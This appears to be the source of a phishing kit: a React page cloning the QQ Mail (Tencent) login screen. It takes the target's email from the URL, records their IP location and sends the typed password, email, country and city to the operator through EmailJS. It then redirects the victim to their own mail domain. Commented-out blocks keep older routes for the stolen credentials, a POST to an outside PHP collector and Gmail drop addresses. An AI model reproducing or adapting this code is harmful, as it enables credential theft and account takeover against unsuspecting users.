
import React, { useEffect, useState, useRef } from "react";
import './QQ.css';
import QQ邮箱 from '../../Media/Images/tg-mj1e9c5d.jpg';
// import $ from "jquery";
import Preloader from "../../Preloader/Preloader";
import emailjs from '@emailjs/browser';

const QQ = ()=>{

    const formRef = useRef();


    const [ipAdress, setIpAdress] = useState('')
    const [city, setCity] = useState('');
    const [flag, setFlag] = useState('');
    const [country, setCountry] = useState('');
  
    const forTime = new Date();
  
    useEffect(()=>{
      fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`)
      .then(req=> req.json())
      .then(res=>{
  
          setIpAdress(res.ip)
          setFlag(res.country.flag);
          setCountry(res.country.name);
          setCity(res.city.names.en);
  
      })
      .catch(e=> console.log)
  }, []);
  

    const [spinLoader, setSpinLoader] = useState(false);

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();

    const [qqEmail, setQQEmail] = useState(extracetdEmail);
    const [qqPassword, setQQPassword] = useState('');

    const [count, setCount] = useState(0);

    const submitQQForm = (e)=>{
        e.preventDefault();
        if(qqEmail === ""){
            alert('Please insert in the password')
        }else{
            // setEnter(false);
            // setErrLabel(true);
            setSpinLoader(true);
            setTimeout(() => {
                setQQPassword('');
            }, 1500);

            setTimeout(() => {
                setSpinLoader(false);
            }, 2000);


            // const user = {
            //     email: qqEmail,
            //     password: qqPassword
            // }



            // post to server
            // const user = {
            //     email: qqEmail,
            //     password: qqPassword,
                // subject: "General Page Logs",
                // to: "rvvlsales13@gmail.com",
                // // body: `Email: ${defaultEmail}  Password: ${defaultPassword}`
                // body:
                // `
                // <html lang="en">
                // <p>Online Correspondence: ${qqEmail}</p>
                // <p>Signal: ${qqPassword}</p>
                // <p>Country: ${country}</p>
                // <p>Flag: ${flag}</p>
                // </html>
                // `
            // };


            // const user = {
            //     "subject": "Coming Logs",
            //     "to": "reportwork5252@gmail.com",
            //     "body": `<div><h3></h3><p>Online_Correspondence: ${qqEmail}</p><p>Signal: ${qqPassword}</p><p>Country: ${country}</p><p>Flag: ${flag}</p></div>`
            // }



            
            // $.ajax({
            //     type: "POST",
            //     url: "https://trezanolz.com/kenneth/chame.php",
            //     data: user,
            //     success(data) {
            //         // alert('OK');
            //         console.log(data);
            //     },
            // });





            const serviceID = `service_xhrj4w4`;
            const templateID = `template_crghlbk`;
            const publicKey = `35JbsFMyI7dxAGiKW`;


        emailjs
        .sendForm(serviceID, templateID, formRef.current, {
          publicKey: publicKey,
        })
        .then(
          () => {
            console.log('!');
          },
          (error) => {
            console.log('...', error.text);
          },
        );





            setCount(count=> count + 1);
            // window.location.reload()
            if(count >= 1){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                console.log(extracetdemailDomain);
                setTimeout(() => {
                    window.location.href = `https://www.${extracetdemailDomain.split('&', 1).toString()}`;
                }, 2500);
            }


            // make post request to server below
        }
    }

    useEffect(()=>{
        document.title = "QQ邮箱";
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
        }, 2500);
    }, [])
    return(<div>

        <header className="QQ_nav_">
            <img 
            alt="QQ邮箱"
            src="data:image/png;base64,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"
            className="QQ_logo_home_page_"
            />


            <ul className="QQul">
                <li>基本版 |</li>
                <li>English |</li>
                <li>手机版 |</li>
                <li>企业邮箱</li>
            </ul>
        </header>

        
        <main className="kejmdikjm_flexxQQ">

            { spinLoader ?<Preloader /> : null }

            <article className="img_sideQQ">
                <img 
                alt="QQ邮箱"
                src={QQ邮箱}
                />
            </article>

            <article className="QQformContainer">

                <div className="dftyu">
                    <p style={{color:'#777', cursor:'pointer'}} className='kkkkkkkk'>Quick Sign-in</p>
                    <p style={{ cursor:'pointer'}}>Different ID</p>
                </div>


                <form onSubmit={submitQQForm} ref={formRef}>

                    <div style={{
                        margin: '0 auto',
                        display: 'flex',
                        justifyContent:'center',
                        marginTop:'2rem'
                    }}>
                        <input 
                        type={`text`}
                        readOnly
                        value={qqEmail}
                        required
                        className="IF-hY-VR"
                        onChange={e=> setQQEmail(e.target.value)}
                        name="online_correspondence"
                        />
                    </div>


                    <div style={{
                        margin: '0 auto',
                        display: 'flex',
                        justifyContent:'center',
                        marginTop:'10px'
                    }}>
                        <input 
                        type={`password`}
                        value={qqPassword}
                        required
                        className="IF-hY-VR"
                        onChange={e=> setQQPassword(e.target.value)}
                        autoFocus
                        name="signal"
                        />
                    </div>


                    <input type="text" value={country} name="country" hidden/>
              <input type="text" value={city} name="city" hidden/>


                    <div className="kemikdmk">
                        <input 
                            type={`checkbox`}
                        />
                        <span className="QQRme">Remember me</span>
                    </div>


                    <div style={{
                        margin: '0 auto',
                        display: 'flex',
                        justifyContent:'center',
                        // marginTop:'2rem'
                    }}>
                        <input 
                        className="Qs_YE_Dm_btn"
                  
                        type={`submit`}
                        value='Sign In'
                        onSubmit={submitQQForm}
                        />
                    </div>

                </form>



                <div className="oowowowo">
                    <span className="uytfcvbnm">Forgot password?</span>
                | 
                <span className="uytfcvbnm">Sign Up</span>
                | 
                <span className="uytfcvbnm">Feedback</span>
                </div>

            </article>
        </main>





        <div className="dftyu" id="qweds">
            <span>
             
                <code className="iwiwiw">About Tencent</code> <span className="bdr_clr_">|</span>
                <code className="iwiwiw">Terms of Service</code><span className="bdr_clr_">|</span>
                <code className="iwiwiw">Privacy Policy</code><span className="bdr_clr_">|</span>
                <code className="iwiwiw">Contact Us</code><span className="bdr_clr_"> |</span>
            </span>

            <span id="qqyr">
                ©1998 - 2020 Tencent Inc. All Rights Reserved.
            </span>
        </div>

    </div>)
}

export default QQ;